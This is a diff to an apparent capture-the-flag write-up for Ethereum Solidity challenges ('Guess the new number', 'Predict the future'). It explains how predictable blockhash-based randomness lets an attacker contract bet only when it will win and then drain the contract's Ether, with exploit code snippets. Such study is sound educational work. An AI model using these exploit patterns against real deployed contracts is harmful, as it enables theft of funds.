@@ -153,9 +153,62 @@ uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
 challenge.guess.value(1 ether)(answer);
 ```
 
+You will also need to let the attacker contract receive Ether:
+
+```solidity
+function() public payable {}
+
+```
+
+And don't forget to transfer the Ether from the attacker contract to your address (or create a withdraw function only callable by you) 💸
+
 [Script](./scripts/lotteries/GuessTheNewNumberChallenge.ts) | [Test](./test/lotteries/GuessTheNewNumberChallenge.spec.ts)
 
 ### Predict the future
+
+The guess answer now has to be set beforehand, and then settled on a new tx, as it requires to be on a future block
+
+```solidity
+function lockInGuess(uint8 n) public payable {
+  guess = n;
+  settlementBlockNumber = block.number + 1;
+}
+
+function settle() public {
+  require(block.number > settlementBlockNumber);
+
+  uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
+
+  if (guess == answer) {
+    msg.sender.transfer(2 ether);
+  }
+}
+
+```
+
+The "random" answer can _only_ be a number between `0-9` because of the `% 10`.
+
+With this in mind we can exploit it:
+
+1. Call `lockInGuess` with any number `0-9`
+2. Create an attacker contract that calculates when that number is equal to the answer
+3. Call `settle` from the attack contract only if it equals our initial random guess
+
+This way we only bet when we know we will win :)
+
+```
+function lockInGuess() public payable {
+  challenge.lockInGuess.value(1 ether)(0); // Guess will be 0
+}
+
+function attack() public {
+  uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
+  require(answer == 0); // Put your guess here
+
+  challenge.settle();
+  msg.sender.transfer(address(this).balance);
+}
+```
 
 [Script](./scripts/lotteries/PredictTheFutureChallenge.ts) | [Test](./test/lotteries/PredictTheFutureChallenge.spec.ts)
 
